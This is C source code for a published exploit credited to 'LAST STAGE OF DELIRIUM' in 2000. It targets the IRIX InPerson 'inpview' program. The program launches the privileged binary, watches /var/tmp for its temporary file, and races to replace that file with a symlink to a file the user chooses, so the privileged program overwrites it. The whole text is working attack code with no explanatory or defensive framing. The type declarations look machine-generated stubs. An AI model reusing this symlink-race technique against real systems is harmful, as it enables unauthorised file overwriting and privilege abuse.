
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct dirent {int d_name; } ;
typedef int DIR ;


 int chdir (char*) ;
 int close (int) ;
 int closedir (int *) ;
 int execl (char*,char*,char*,char*,int ) ;
 int execle (char*,char*,int ,int ) ;
 int exit (int) ;
 int fflush (int ) ;
 int fork () ;
 int nice (int) ;
 int * opendir (char*) ;
 int printf (char*,...) ;
 struct dirent* readdir (int *) ;
 int rewinddir (int *) ;
 int sleep (int) ;
 int stdout ;
 int strncmp (int ,char*,int) ;
 int symlink (char*,int ) ;
 int unlink (int ) ;

main(int argc,char **argv){
    DIR *dirp;struct dirent *dentp;

    printf("copyright LAST STAGE OF DELIRIUM jan 2000 poland  //lsd-pl.net/\n");
    printf("/usr/lib/InPerson/inpview for irix 6.5 6.5.8 IP:all\n\n");

    if(argc!=2){
        printf("usage: %s file\n",argv[0]);
        exit(-1);
    }

    if(!fork()){
        nice(-20);sleep(2);close(0);close(1);close(2);
        execle("/usr/lib/InPerson/inpview","lsd",0,0);
    }

    printf("looking for temporary file... ");fflush(stdout);
    chdir("/var/tmp");
    dirp=opendir(".");
    while(1){
        if((dentp=readdir(dirp))==((void*)0)) {rewinddir(dirp);continue;}
        if(!strncmp(dentp->d_name,".ilmpAAA",8)) break;
    }
    closedir(dirp);
    printf("found!\n");
    while(1){
        if(!symlink(argv[1],dentp->d_name)) break;
    }
    sleep(2);
    unlink(dentp->d_name);

    execl("/bin/ls","ls","-l",argv[1],0);
}
